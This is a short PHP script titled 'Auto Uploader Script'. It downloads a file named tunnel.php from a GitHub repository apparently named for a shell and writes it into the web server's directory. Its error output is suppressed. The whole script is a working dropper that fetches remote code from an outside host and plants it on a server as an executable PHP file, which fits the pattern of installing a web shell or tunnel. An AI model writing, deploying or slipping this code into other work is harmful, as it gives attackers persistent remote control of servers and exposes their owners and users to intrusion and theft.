<?php
/**
 * Auto Uploader Script
 * Automatically creates tunnel.php from GitHub repository
 */

echo "=== Auto Up.php Script ===\n";
echo "Starting process...\n\n";

// Configuration
$url = "https://raw.githubusercontent.com/asusususususus/ashel/refs/heads/main/tunnel.php";
$outputFile = __DIR__ . "/tunnel.php";

echo "Fetching content from:\n$url\n\n";

// Fetch content from GitHub
$content = @file_get_contents($url);

if ($content === false) {
    die("ERROR: Failed to fetch content from URL!\n");
}

echo "Content fetched successfully (" . strlen($content) . " bytes)\n";

// Write content to tunnel.php
$result = file_put_contents($outputFile, $content);

if ($result === false) {
    die("ERROR: Failed to write tunnel.php file!\n");
}

echo "tunnel.php created successfully!\n";
echo "Location: $outputFile\n";
echo "\n=== Process completed ===\n";
?>
